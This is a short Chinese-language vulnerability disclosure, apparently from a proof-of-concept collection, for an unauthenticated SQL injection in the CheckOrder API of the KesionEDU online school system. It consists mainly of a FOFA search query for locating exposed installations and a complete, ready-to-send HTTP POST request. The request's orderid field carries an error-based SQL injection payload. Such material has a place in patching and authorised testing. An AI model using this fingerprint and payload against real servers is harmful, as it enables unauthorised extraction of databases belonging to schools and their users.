# 科汛新职教网校系统CheckOrder存在SQL注入漏洞

科汛新职教网校系统KesionEDU CheckOrder 接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息。

## fofa
```javascript
body="/KS_Inc/static/edu"
```

## poc
```javascript
POST /webapi/APP/CheckOrder HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: application/json, text/javascript, */*; q=0.01
Priority: u=0
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest

{"orderid":"1' AND 7755 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(112)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (7755=7755) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(107)+CHAR(113)))-- Ahbw","apptoken":"1","ordertype":"1"}
```

![image-20241227223044294](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412272230369.png)